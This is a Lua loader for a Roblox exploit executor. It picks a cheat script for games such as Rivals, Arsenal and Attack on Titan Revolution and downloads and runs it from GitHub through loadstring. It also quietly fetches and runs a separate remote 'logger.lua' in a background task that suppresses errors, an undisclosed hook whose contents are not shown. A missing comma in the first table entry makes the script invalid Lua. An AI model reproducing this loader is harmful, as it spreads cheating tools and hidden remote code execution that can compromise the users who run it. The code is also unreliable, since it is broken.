local placeId = game.PlaceId

if getgenv().loadedPlaceId == placeId then
    return
end

getgenv().loadedPlaceId = placeId

repeat task.wait() until game:IsLoaded()

local players = game:GetService("Players")
local marketplace = game:GetService("MarketplaceService")
local httpservice = game:GetService("HttpService")

local localplayer = players.LocalPlayer

local scripts = {

	 [13379208636] = {
		name = "Attack on Titan Revolution"
		url = "https://raw.githubusercontent.com/5glx/Vantapriv/main/Aotr.lua"},
     [17625359962] = {
        name = "Rivals",
        url = "https://raw.githubusercontent.com/5glx/Vantapriv/refs/heads/main/Rivals.lua"
    },
     [286090429] = {
        name = "Arsenal",
        url = "https://raw.githubusercontent.com/5glx/Vantapriv/refs/heads/main/Arsenal.lua"
    },
     default = {
        name = "Universal",
        url = "https://raw.githubusercontent.com/5glx/Vantapriv/refs/heads/main/Universal.lua"
    }
}

local function getscript()
    local data = scripts[game.PlaceId] or scripts.default
    return data.url, data.name
end

local function load(url)
    local ok, res = pcall(function()
        return game:HttpGet(url)
    end)

    if not ok then
        warn("[loader] HTTP failed:", res)
        return
    end

    local success, err = pcall(function()
        loadstring(res)()
    end)

    if not success then
        warn("[loader] execution failed:", err)
    end
end

task.spawn(function()
    pcall(function()
        load("https://raw.githubusercontent.com/5glx/Vanta/main/logger.lua")
    end)
end)

local scripturl = getscript()
load(scripturl)